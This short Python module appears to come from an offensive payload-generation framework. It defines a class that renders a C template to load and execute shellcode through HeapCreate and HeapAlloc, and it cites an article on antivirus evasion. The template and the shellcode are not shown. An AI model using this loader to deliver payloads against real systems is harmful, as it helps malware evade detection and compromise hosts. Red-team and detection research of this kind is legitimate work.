from .base import CLangBase


class HCHAExec(CLangBase):
    # Uses HeapCreate + HeapAlloc to load and execute shelllcode
    # https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/
    def __init__(self, shellcode, arch="x64"):
        super().__init__()
        self.name = "hc_ha_exec"

        self.shellcode = shellcode
        self.arch = arch

    @property
    def invocation(self):
        return "hchaae();"

    @property
    def method(self):
        return self.template.render(shellcode=self.shellcode)
